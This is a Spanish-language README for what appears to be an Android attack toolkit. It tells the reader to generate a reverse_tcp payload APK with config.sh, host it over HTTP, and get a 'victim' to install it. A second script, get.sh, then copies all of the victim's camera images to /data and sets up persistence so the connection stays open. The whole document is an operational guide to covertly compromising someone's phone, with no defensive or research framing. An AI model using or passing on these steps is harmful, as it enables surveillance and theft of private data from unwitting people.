# 1. Genear el payload y configuracion inicial

Para ello utilizamos el comando

```shell
sudo bash config.sh
```

Este comando ejecutara un script encargado de generar un payload con reverse_tcp para un android, por defeto utiliza hostname -I, y para el puerto 4444, pero se puede modificar o en el caso de no ser compatible, utilizando el parametro --ip |-i para el host y --port | -p para el puerto ej:

```shell
sudo bash config.sh -i 192.127.0.80 -p 4443
```

# 2. Conexión con el usuario

> [IMPORTANT] Asegúrate de estar conectado a la misma red que la víctima antes de ejecutar el exploit.

Se creará un apk llamado main.apk
Una vez ejecutado el coamndo anterior aparecerá un mensaje como el siguiente print_green "Archivo main.apk disponible en http://$LOCAL_IP:$PORT_PYTHON/main.apk"
Una vez creado deverá ser instalado por el usuario victima, ya sea medante la url, a la web donde se encuentra un botón para ello, desde la ruta /main.apk, o pasandoselo de cualquier otra foprma.

# 3. Obtener los datos

Una vez estemos conectados nuestra víctima utilizaremos el siguiente comando

```shell
sudo bash get.sh -u $USER
```

Una vez conectados podemos hacer todo lo que desehemos pero este pack incluye una forma rapida mediante un script de poder descargarnos toda la información que deseemos de nuestra "victima" envie todos las imagenes de su camara a el directorio /data
Tmabién generará un archivo de peristencia para que no cierre sesión en ningun momento, y que siempre que no se apage el dispositivo y permaneza en la misma red se esté conectado.
